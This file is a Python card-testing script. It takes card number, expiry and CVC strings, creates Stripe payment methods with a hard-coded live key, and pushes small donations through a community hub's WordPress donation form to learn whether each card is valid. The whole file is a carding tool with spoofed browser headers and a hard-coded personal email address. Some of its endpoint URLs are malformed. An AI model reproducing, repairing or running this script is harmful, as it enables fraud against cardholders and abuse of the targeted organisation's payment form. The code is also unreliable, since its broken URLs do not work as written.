import requests, re
import random

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if "20" in yy: # Mo3gza
        yy = yy.split("20")[1]
        
    r = requests.session()
    
    random_amount1 = random.randint(1, 4)
    random_amount2 = random.randint(1, 99)

    headers = {
        'authority': '://stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://stripe.com',
        'referer': 'https://stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&billing_details[name]=Niko&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fa246437755%3B+stripe-js-v3%2Fa246437755%3B+card-element&key=pk_live_51JFgfTKqjmzJCbSr9wtxl0XojHckW6m9jJFVUKw1MHDix6dpGRuJAPXV0LRBU5y5r5FmIq8c3EVywaikYyU45Wg600Va8cE1WA'
    
    response = requests.post('https://://stripe.com/v1/payment_methods', headers=headers, data=data)
    
    pm = response.json()['id']
    
    headers = {
        'authority': 'levcomhub.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://levcomhub.com',
        'referer': 'https://levcomhub.com',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'action': 'wp_full_stripe_inline_donation_charge',
        'wpfs-form-name': 'leverhulme_community_hub',
        'wpfs-form-get-parameters': '%7B%7D',
        'wpfs-custom-amount': 'other',
        'wpfs-custom-amount-unique': '0.5',
        'wpfs-donation-frequency': 'one-time',
        'wpfs-custom-input[]': 'Lee',
        'wpfs-card-holder-email': 'sattlin10@gmail.com',
        'wpfs-card-holder-name': 'Niko',
        'wpfs-terms-of-use-accepted': '1',
        'wpfs-stripe-payment-method-id': f'{pm}',
    }
    
    response = requests.post('https://levcomhub.com', headers=headers, data=data)
    
    result = response.json()['message']
    
    return result